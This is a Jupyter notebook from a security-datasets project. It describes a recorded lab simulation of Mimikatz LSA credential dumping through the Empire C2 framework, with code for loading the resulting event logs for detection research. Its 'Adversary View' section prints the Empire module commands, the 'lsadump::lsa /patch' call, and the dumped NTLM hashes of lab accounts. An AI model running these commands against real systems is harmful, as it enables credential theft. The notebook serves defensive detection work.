{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d2249c83",
   "metadata": {},
   "source": [
    "# Empire Mimikatz Lsadump LSA Patch"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "daaa28f9",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f325ce36",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.001](https://attack.mitre.org/techniques/T1003/001) |\n",
    "| Tags              | LSASS Memory Credentials Read |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "79f2a316",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries reading credentials from the memory contents of lsass.exe. One popular tool performing this behavior is Mimikatz."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8a11a46b",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "075bbda7",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e4d93122",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a149c5c",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0e199502",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [lsadump](https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb2d0d84",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/lsadump*\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz LSA Dump\n",
    "            Module: powershell/credentials/mimikatz/lsadump\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @JosephBialek\n",
    "  @gentilkiwi\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to extract a\n",
    "  particular user hash from memory. Useful on domain\n",
    "  controllers.\n",
    "\n",
    "Comments:\n",
    "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt\n",
    "  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls\n",
    "  a\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name     Required    Value                     Description\n",
    "  ----     --------    -------                   -----------\n",
    "  Agent    True        B7Y8G4XC                  Agent to run module on.                 \n",
    "  Username False                                 Username to extract the hash for, blank \n",
    "                                                for all local passwords.                \n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) > execute\n",
    "[*] Tasked B7Y8G4XC to run TASK_CMD_JOB\n",
    "[*] Agent B7Y8G4XC tasked with task ID 2\n",
    "[*] Tasked agent B7Y8G4XC to run module powershell/credentials/mimikatz/lsadump\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) > \n",
    "Job started: VGHXZ5\n",
    "\n",
    "Hostname: WORKSTATION5.theshire.local / S-1-5-21-1363495622-3806888128-621328882\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::lsa /patch\n",
    "Domain : WORKSTATION5 / S-1-5-21-1549354820-3669603161-4025758380\n",
    "\n",
    "RID  : 000001f7 (503)\n",
    "User : DefaultAccount\n",
    "LM   : \n",
    "NTLM : \n",
    "\n",
    "RID  : 000001f5 (501)\n",
    "User : Guest\n",
    "LM   : \n",
    "NTLM : \n",
    "\n",
    "RID  : 000001f4 (500)\n",
    "User : wardog\n",
    "LM   : \n",
    "NTLM : 42ddb2963bbe8f1c075fc869d3bce33e\n",
    "\n",
    "RID  : 000001f8 (504)\n",
    "User : WDAGUtilityAccount\n",
    "LM   : \n",
    "NTLM : 45a313f1860be24e967e55b94649aa31\n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/lsadump) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "171f87fc",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ddd479c1",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61401b57",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "92f4ef27",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7caaa76",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "166ef070",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e76d0ef9",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fdddf8b8",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html](https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
